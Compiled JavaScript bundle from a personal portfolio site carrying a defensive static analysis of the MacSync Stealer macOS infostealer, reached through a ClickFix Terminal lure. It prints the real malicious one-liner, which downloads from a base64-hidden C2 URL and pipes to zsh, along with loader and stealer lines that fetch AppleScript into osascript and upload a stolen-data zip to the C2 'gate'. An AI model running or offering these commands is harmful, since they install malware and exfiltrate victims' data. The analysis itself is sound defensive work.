(globalThis.TURBOPACK||(globalThis.TURBOPACK=[])).push(["object"==typeof document?document.currentScript:void 0,64529,e=>{"use strict";var r=e.i(43476),t=e.i(22016);let a={cybersecurity:[{href:"/projects/cybersecurity/ssti1",title:"PicoCTF: SSTI1"},{href:"/projects/cybersecurity/nosql-injection",title:"PicoCTF: No Sql Injection"},{href:"/projects/cybersecurity/eval",title:"PicoCTF: 3v@l"},{href:"/projects/cybersecurity/soap",title:"PicoCTF: SOAP"},{href:"/projects/cybersecurity/macsync-stealer",title:"MacSync Stealer"},{href:"/projects/cybersecurity/cupid-portal",title:"HTCOTB2026 CTF: Cupid's Secret Message"},{href:"/projects/cybersecurity/heartmail",title:"HTCOTB2026 CTF: HeartMail 1.0"},{href:"/projects/cybersecurity/wicys-ctf-01",title:"WiCyS CTF: Bunny Tracker Glitch"},{href:"/projects/cybersecurity/wicys-ctf-02",title:"WiCyS CTF: Luck Checker"},{href:"/projects/cybersecurity/wicys-ctf-03",title:"WiCyS CTF: Bunny Network - Portal Override"},{href:"/projects/cybersecurity/wicys-ctf-04",title:"WiCyS CTF: Bunny Overflow"},{href:"/projects/cybersecurity/wicys-ctf-05",title:"WiCyS CTF: Rainbow Vault Overflow"},{href:"/projects/cybersecurity/wicys-ctf-06",title:"WiCyS CTF: ROP Around the Rainbow"},{href:"/projects/cybersecurity/wicys-ctf-07",title:"WiCyS CTF: Scavenger Hunt"},{href:"/projects/cybersecurity/wicys-ctf-08",title:"WiCyS CTF: Bunny Network API Override"},{href:"/projects/cybersecurity/wicys-ctf-09",title:"WiCyS CTF: Leprechauns Vault"}],"game-dev":[{href:"/projects/game-dev/my-first-game",title:"My First Game"},{href:"/projects/game-dev/ufo",title:"UFO"},{href:"/projects/game-dev/tank-game",title:"Tank Game"},{href:"/projects/game-dev/3d-game",title:"3D Game Engine"},{href:"/projects/game-dev/blackhole-simulator",title:"Blackhole Simulator"}],music:[{href:"/projects/music/blind-justice-investigation",title:"BL1ND JUST1C3: 1NV3ST1G4T1ON"},{href:"/projects/music/beethoven-virus",title:"Beethoven Virus"},{href:"/projects/music/the-longest-moment",title:"The Longest Moment Before a New Beginning"}],auto:[{href:"/projects/auto/tacoma-valve-cover",title:"Valve Cover Replacement & Modification (2002 Toyota Tacoma)"},{href:"/projects/auto/transmission-rebuild",title:"Manual Transmission Rebuild (1989 Honda Accord)"}],engineering:[{href:"/projects/engineering/rc-car",title:"Remote Control Car"}]};function s({category:e,currentPath:s}){let i=a[e],o=i.findIndex(e=>e.href===s);if(-1===o)return null;let n=i[o-1],l=i[o+1],c="group rounded-2xl border border-gray-200 bg-gray-85 px-5 py-4 transition-colors hover:border-blue-400 hover:bg-blue-50 dark:border-gray-800 dark:bg-gray-900 dark:hover:border-blue-500 dark:hover:bg-blue-950/30",d="rounded-2xl border border-dashed border-gray-200 bg-gray-50/70 px-5 py-4 opacity-60 dark:border-gray-800 dark:bg-gray-900/70",m="text-xs font-semibold uppercase tracking-[0.18em] text-gray-500 dark:text-gray-400",u="mt-2 text-base font-semibold text-gray-900 transition-colors group-hover:text-blue-700 dark:text-gray-100 dark:group-hover:text-blue-300",p="mt-2 text-base font-semibold text-gray-500 dark:text-gray-400";return(0,r.jsxs)("nav",{"aria-label":"Project navigation",className:"mt-12 grid w-full max-w-4xl grid-cols-1 gap-6 md:grid-cols-2",children:[l?(0,r.jsxs)(t.default,{href:l.href,className:c,children:[(0,r.jsx)("p",{className:m,children:"← Next Project"}),(0,r.jsx)("p",{className:u,children:l.title})]}):(0,r.jsxs)("div",{className:d,children:[(0,r.jsx)("p",{className:m,children:"← Next Project"}),(0,r.jsx)("p",{className:p,children:"End of category"})]}),n?(0,r.jsxs)(t.default,{href:n.href,className:`${c} text-right`,children:[(0,r.jsx)("p",{className:m,children:"Previous Project →"}),(0,r.jsx)("p",{className:u,children:n.title})]}):(0,r.jsxs)("div",{className:`${d} text-right`,children:[(0,r.jsx)("p",{className:m,children:"Previous Project →"}),(0,r.jsx)("p",{className:p,children:"Start of category"})]})]})}e.s(["default",()=>s],64529)},77509,e=>{"use strict";var r=e.i(43476),t=e.i(22016),a=e.i(64529);let s=`
  :root {
    --wu-border: #e5e7eb;
    --wu-muted: #6b7280;
    --wu-accent: #2563eb;
    --wu-bg-alt: #f9fafb;
  }

  .dark {
    --wu-border: #1f2937;
    --wu-muted: #9ca3af;
    --wu-accent: #3b82f6;
    --wu-bg-alt: #111827;
  }

  .page-wrap { box-sizing: border-box; }

  .page-wrap {
    position: relative;
    z-index: 1;
    max-width: 860px;
    margin: 0 auto;
    padding: 3rem 1.5rem 6rem;
    color: var(--foreground);
    font-family: inherit;
  }

  .back-link {
    display: inline-block;
    margin-bottom: 2rem;
    color: var(--wu-muted);
    text-decoration: none;
    font-size: 0.875rem;
    transition: color 0.2s ease;
  }
  .back-link:hover {
    color: var(--wu-accent);
  }

  .page-wrap header {
    border-bottom: 1px solid var(--wu-border);
    padding-bottom: 2rem;
    margin-bottom: 3rem;
  }

  .ctf-label {
    font-size: 0.75rem;
    letter-spacing: 0.2em;
    color: var(--wu-muted);
    text-transform: uppercase;
    font-weight: 600;
    margin-bottom: 0.5rem;
  }

  .page-wrap header h1 {
    font-size: clamp(2.25rem, 5vw, 3rem);
    font-weight: 800;
    line-height: 1.1;
    margin-bottom: 1.2rem;
    letter-spacing: -0.025em;
  }

  .meta-grid {
    display: flex;
    flex-wrap: wrap;
    gap: 0.6rem 1.4rem;
    font-size: 0.875rem;
  }

  .meta-item {
    display: flex;
    align-items: center;
    gap: 0.4rem;
    color: var(--wu-muted);
  }

  .meta-item span.val {
    color: var(--foreground);
    font-weight: 500;
  }

  .badge {
    display: inline-block;
    font-size: 0.75rem;
    font-weight: 700;
    letter-spacing: 0.1em;
    text-transform: uppercase;
    background: none !important;
    border: none !important;
    padding: 0 !important;
  }
  .badge.diff-easy   { color: #70ff50; }
  .badge.diff-medium { color: #ffcc00; }
  .badge.diff-hard   { color: #ff6680; }

  section {
    margin-bottom: 2.8rem;
  }

  .section-header {
    display: flex;
    align-items: center;
    gap: 0.8rem;
    margin-bottom: 1.2rem;
  }

  .section-num {
    font-size: 0.875rem;
    color: var(--wu-accent);
    font-weight: 700;
    opacity: 0.8;
  }

  h2 {
    font-size: 1.25rem;
    font-weight: 700;
    letter-spacing: -0.01em;
  }

  .section-line {
    flex: 1;
    height: 1px;
    background: var(--wu-border);
  }

  .card {
    background: var(--wu-bg-alt);
    border: 1px solid var(--wu-border);
    padding: 1.5rem;
    margin-bottom: 1.5rem;
    border-radius: 0.75rem;
  }

  .card h3 {
    font-size: 1.125rem;
    font-weight: 700;
    margin-bottom: 0.75rem;
  }

  .card ul {
    list-style: none;
    padding: 0;
  }

  .card ul li {
    padding: 0.25rem 0 0.25rem 1.25rem;
    position: relative;
    color: var(--foreground);
    font-size: 1rem;
  }

  .card ul li::before {
    content: "•";
    position: absolute;
    left: 0;
    color: var(--wu-accent);
    font-weight: bold;
  }

  .step {
    border: 1px solid var(--wu-border);
    border-radius: 0.75rem;
    margin-bottom: 1.25rem;
    overflow: hidden;
    background: var(--background);
  }

  .step-header {
    display: flex;
    align-items: center;
    gap: 0.8rem;
    padding: 0.75rem 1.25rem;
    border-bottom: 1px solid var(--wu-border);
    background: var(--wu-bg-alt);
  }

  .step-num {
    font-size: 0.875rem;
    font-weight: 700;
    color: var(--wu-muted);
    min-width: 2.5rem;
  }

  .step-label {
    font-size: 1rem;
    font-weight: 600;
    color: var(--foreground);
    flex: 1;
  }

  .step-body {
    padding: 1.25rem;
  }

  .io-row {
    display: grid;
    grid-template-columns: 80px 1fr;
    gap: 0.4rem 0.8rem;
    margin-bottom: 1rem;
    align-items: start;
  }

  .io-label {
    font-size: 0.75rem;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.05em;
    padding-top: 0.35rem;
  }

  .io-label.in  { color: var(--wu-accent);  }
  .io-label.out { color: #10b981; }

  code {
    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
    font-size: 0.9rem;
    background: var(--wu-bg-alt);
    border: 1px solid var(--wu-border);
    padding: 0.75rem 1rem;
    display: block;
    border-radius: 0.5rem;
    color: var(--foreground);
    word-break: break-all;
    white-space: pre-wrap;
    line-height: 1.5;
  }

  code.inline-code {
    display: inline;
    padding: 0.2rem 0.4rem;
    background: var(--wu-bg-alt);
    border: 1px solid var(--wu-border);
    border-radius: 0.375rem;
    color: var(--wu-accent);
    font-size: 0.875em;
  }

  .reason {
    font-size: 1rem;
    color: var(--wu-muted);
    margin-top: 0.75rem;
    padding-top: 0.75rem;
    border-top: 1px dashed var(--wu-border);
    line-height: 1.6;
  }

  .prose {
    font-size: 1.1rem;
    color: var(--foreground);
    line-height: 1.75;
    margin-bottom: 1.25rem;
    opacity: 0.9;
  }

  .notice-box {
    border: 1px solid var(--wu-border);
    padding: 1.25rem;
    margin-bottom: 1.5rem;
    border-radius: 0.75rem;
    background: var(--wu-bg-alt);
    font-size: 0.95rem;
    font-style: italic;
  }

  .flag-box {
    background: var(--wu-bg-alt);
    border: 1px solid var(--wu-border);
    border-radius: 0.75rem;
    padding: 1.25rem;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 0.5rem;
  }

  .flag-label {
    font-size: 0.75rem;
    letter-spacing: 0.15em;
    color: var(--wu-muted);
    text-transform: uppercase;
    font-weight: 700;
  }

  .flag-value {
    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
    font-size: 1rem;
    font-weight: 600;
    color: var(--wu-accent);
    word-break: break-all;
    text-align: center;
    padding: 0.5rem 1rem;
    background: var(--background);
    border: 1px solid var(--wu-border);
    border-radius: 0.5rem;
    width: 100%;
    max-width: 500px;
  }

  .tags {
    display: flex;
    flex-wrap: wrap;
    gap: 0.5rem;
    margin-top: 1rem;
  }

  .tag {
    font-size: 0.75rem;
    font-weight: 500;
    padding: 0.25rem 0.75rem;
    border: 1px solid var(--wu-border);
    color: var(--wu-muted);
    border-radius: 9999px;
    background: var(--wu-bg-alt);
  }

  
`;function i({data:e,currentPath:i}){let o=e=>e.split(/(`[^`]+`)/g).map((e,t)=>e.startsWith("`")&&e.endsWith("`")?(0,r.jsx)("code",{className:"inline-code",children:e.slice(1,-1)},t):(0,r.jsx)("span",{dangerouslySetInnerHTML:{__html:e}},t));return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)("style",{children:s}),(0,r.jsxs)("div",{className:"page-wrap",children:[(0,r.jsx)(t.default,{href:"/projects/cybersecurity",className:"back-link",children:"← Back to Cybersecurity Projects"}),(0,r.jsxs)("header",{children:[(0,r.jsx)("div",{className:"ctf-label",children:e.customLabel||"PicoCTF — Write-Up"}),(0,r.jsx)("h1",{children:e.title}),(0,r.jsxs)("div",{className:"meta-grid",children:[e.category&&(0,r.jsxs)("div",{className:"meta-item",children:[(0,r.jsx)("span",{children:"Category:"}),(0,r.jsx)("span",{className:"val",children:e.category})]}),e.points&&(0,r.jsxs)("div",{className:"meta-item",children:[(0,r.jsx)("span",{children:"Points:"}),(0,r.jsx)("span",{className:"val",children:e.points})]}),(0,r.jsxs)("div",{className:"meta-item",children:[(0,r.jsx)("span",{children:"Author:"}),(0,r.jsx)("span",{className:"val",children:e.author})]}),e.difficulty&&(0,r.jsxs)("div",{className:"meta-item",children:[(0,r.jsx)("span",{children:"Difficulty:"}),(0,r.jsx)("span",{className:`badge diff-${e.difficulty}`,children:e.difficulty.charAt(0).toUpperCase()+e.difficulty.slice(1)})]})]}),(0,r.jsx)("div",{className:"tags",children:e.tags.map(e=>(0,r.jsxs)("span",{className:"tag",children:["#",e]},e))})]}),e.sections.map((e,t)=>(0,r.jsxs)("section",{children:[(0,r.jsxs)("div",{className:"section-header",children:[(0,r.jsx)("span",{className:"section-num",children:String(t+1).padStart(2,"0")}),(0,r.jsx)("h2",{children:e.title}),(0,r.jsx)("div",{className:"section-line"})]}),e.prose&&(0,r.jsx)("p",{className:"prose",children:o(e.prose)}),e.notice&&(0,r.jsx)("div",{className:"notice-box",children:o(e.notice)}),e.cards?.map((e,t)=>(0,r.jsxs)("div",{className:"card",children:[(0,r.jsx)("h3",{children:e.title}),(0,r.jsx)("ul",{children:e.items.map((e,t)=>(0,r.jsx)("li",{children:o(e)},t))})]},t)),e.steps?.map((e,t)=>(0,r.jsxs)("div",{className:"step",children:[(0,r.jsxs)("div",{className:"step-header",children:[(0,r.jsxs)("span",{className:"step-num",children:["STEP ",e.number]}),(0,r.jsx)("span",{className:"step-label",children:e.label})]}),(0,r.jsxs)("div",{className:"step-body",children:[e.prose&&(0,r.jsx)(r.Fragment,{children:e.prose.split("\n\n").map((e,t)=>(0,r.jsx)("p",{className:"prose",children:o(e)},t))}),e.notice&&(0,r.jsx)("div",{className:"notice-box",children:o(e.notice)}),e.input&&(0,r.jsxs)("div",{className:"io-row",children:[(0,r.jsx)("span",{className:"io-label in",children:"INPUT"}),(0,r.jsx)("code",{children:e.input})]}),e.output&&(0,r.jsxs)("div",{className:"io-row",children:[(0,r.jsx)("span",{className:"io-label out",children:"OUTPUT"}),(0,r.jsx)("code",{className:"output",children:e.output})]}),e.reason&&(0,r.jsx)("p",{className:"reason",children:o(e.reason)})]})]},t))]},t)),e.flag&&(0,r.jsxs)("section",{children:[(0,r.jsxs)("div",{className:"section-header",children:[(0,r.jsx)("span",{className:"section-num",children:"FF"}),(0,r.jsx)("h2",{children:"Flag"}),(0,r.jsx)("div",{className:"section-line"})]}),(0,r.jsxs)("div",{className:"flag-box",children:[(0,r.jsx)("div",{className:"flag-label",children:"Captured Flag"}),(0,r.jsx)("div",{className:"flag-value",children:e.flag})]})]}),(0,r.jsxs)("footer",{children:[(0,r.jsxs)("span",{children:[e.author," — ",e.customLabel||"PicoCTF Write-Up"]}),(0,r.jsx)("span",{children:"All steps performed in a legal environment."})]}),(0,r.jsx)(a.default,{category:"cybersecurity",currentPath:i})]})]})}e.s(["default",()=>i])},12889,e=>{"use strict";var r=e.i(43476),t=e.i(77509);function a(){let e={title:"MacSync Stealer: Static Malware Analysis",author:"Kelvin Creighton",tags:["malware","macos","zsh","static-analysis","applescript"],flag:"",customLabel:"Malware Analysis — Write-Up",sections:[{title:"Initial Discovery",prose:"In December 2025, a friend encountered a suspicious 'ClickFix' campaign. Intrigued, I decided to take a look. The lure was simple: a popup urging users to download an application by running a 'simple' command in their Terminal. To build trust, the campaign even included an embedded video of someone supposedly running the command on a VM.\n\nThe command provided was an obfuscated one-liner designed to bypass mental filters by appearing 'technical' and 'complicated':",steps:[{number:"01",label:"The Malicious One-Liner",input:"curl -kfsSL $(echo 'aHR0cDovL2ZvbGRleG1vb24ud29ybGQvY3VybC9lYzdlNzRkM2E1MDY1NzZmZmFmNTAyMDg3Yjk1YzIzYzEzMWExYWRmMmU1ZDAwYjkwN2UwZDc3ZDIyYjQzN2Ey'|base64 -D)|zsh",output:"[Executes Stage 1 Loader]",reason:"<strong>Reason:</strong> The command decodes a Base64 string to reveal the hidden C2 URL (`http://foldexmoon.world/curl/...`), downloads the payload silently using `curl`, and immediately pipes it into `zsh` for execution. Obfuscating the URL prevents users from easily checking it in a browser, where security filters might trigger a warning."},{number:"02",label:"C2 Header Analysis",input:"curl -I --max-time 5 http://foldexmoon.world/curl/ec7e74d3a506576ffaf502087b95c23c131a1adf2e5d00b907e0d77d22b437a2",output:'HTTP/1.1 200 OK\nContent-Type: application/octet-stream\nContent-Length: 834\nServer: cloudflare\nContent-Disposition: attachment; filename="ec7e74d3a506576ffaf502087b95c23c131a1adf2e5d00b907e0d77d22b437a2.daily"',reason:"<strong>Reason:</strong> The server delivers an 834-byte binary stream with a `.daily` extension. The use of Cloudflare and a non-standard extension is a common obfuscation tactic for Malware-as-a-Service (MaaS) distribution."}]},{title:"Stage 1: The Zsh Loader",prose:"The downloaded file revealed itself to be a Zsh script. Its sole purpose is to decode and execute a second-stage payload entirely in memory, a technique known as 'fileless' execution which helps evade traditional antivirus scans that look for malicious files on disk.",steps:[{number:"01",label:"Deobfuscating the Stager",input:"cat ec7e74d3a506576ffaf502087b95c23c131a1adf2e5d00b907e0d77d22b437a2.daily",output:"#!/bin/zsh\nd25941=$(base64 -D <<'PAYLOAD_m14659633818266' | gunzip\nH4sIAFAeM2kAA+VU0W7TMBR971dcsmrqJJI4cROvHWWbJsHQmIa0ISYBqhz7urXq2FHism7AvxO6...\nPAYLOAD_m14659633818266\n)\neval \"$d25941\"",reason:"<strong>Reason:</strong> The script uses `base64 -D` (a macOS-specific flag) and `gunzip` to unpack the hidden payload. The `eval` command then executes the result immediately."},{number:"02",label:"Extracting Stage 2",input:'echo "[BASE64_DATA]" | base64 -D | gunzip > stage2.sh',output:"[A 1.3KB Zsh Script]",reason:"<strong>Reason:</strong> By manually decoding the payload, we reveal the core logic of the MacSync Stealer before it can execute and hide itself."}]},{title:"Stage 2: The Stealer Core",prose:"The second stage is a sophisticated Zsh-based stealer that acts as a background daemon. It is designed to be persistent, stealthy, and highly dynamic by fetching AppleScript payloads directly from the C2 server.",steps:[{number:"01",label:"Stealth Mechanisms",input:"head -n 10 stage2.sh",output:'daemon_function() {\n    exec </dev/null\n    exec >/dev/null\n    exec 2>/dev/null\n    local domain="foldexmoon.world"',reason:"<strong>Reason:</strong> The script redirects all standard streams to `/dev/null`, ensuring no output is visible in the user's Terminal. It then defines its Command & Control (C2) infrastructure."},{number:"02",label:"Dynamic AppleScript Execution",input:"grep 'osascript' stage2.sh",output:'curl -k -s ... "http://$domain/dynamic?txd=$token" | osascript',reason:"<strong>Reason:</strong> This is a critical discovery. The malware downloads dynamic AppleScript code and pipes it into `osascript`. This allows the attacker to push new stealing logic (Keychain access, browser data harvesting, etc.) without updating the main script."},{number:"03",label:"Data Exfiltration (The 'Gate')",input:"grep 'POST' stage2.sh",output:'curl -k -X POST ... -F "file=@/tmp/osalogging.zip" ... "http://$domain/gate"',reason:"<strong>Reason:</strong> The malware bundles stolen data into `/tmp/osalogging.zip` and uploads it to the `/gate` endpoint. Research confirms that `osalogging.zip` is a known Indicator of Compromise (IoC) for the MacSync family."}]},{title:"Context & Research",prose:"After my initial analysis in December 2025, further research confirmed this was MacSync Stealer (also known as Mac.c), a Malware-as-a-Service (MaaS) created by the threat actor 'Mentalpositive'.",cards:[{title:"Evolution of MacSync",items:["<strong>Origins:</strong> Emerged in April 2025 as a cheap, accessible infostealer for entry-level cybercriminals.","<strong>Social Engineering:</strong> Leverages the complexity of Terminal commands to bypass user suspicion. The use of `base64` encoding prevents link discovery through browser-based security filters.","<strong>Trust Building:</strong> Employs social proof, such as embedded videos of VMs supposedly running the command safely, to manipulate users into taking high-risk actions.","<strong>Distribution:</strong> Evolved from 'ClickFix' Terminal commands to highly sophisticated, Apple-notarized Swift applications to bypass Gatekeeper.","<strong>Infrastructure:</strong> Extensive use of the `.world` and `.shop` TLDs (e.g., `foldexmoon.world`) for C2 operations."]}]},{title:"Key Takeaways",cards:[{title:"Security Recommendations",items:["Never copy and paste commands from untrusted websites into your Terminal, even if they appear to be from 'trusted' sources like GitHub or ChatGPT.","The use of `curl | sh` or `curl | osascript` is a high-risk pattern that should be treated with extreme suspicion.","Regularly audit your `/tmp` directory and background processes for unusual activity, particularly those redirecting all output to `/dev/null`."]}]}]};return(0,r.jsx)(t.default,{data:e,currentPath:"/projects/cybersecurity/macsync-stealer"})}e.s(["default",()=>a])}]);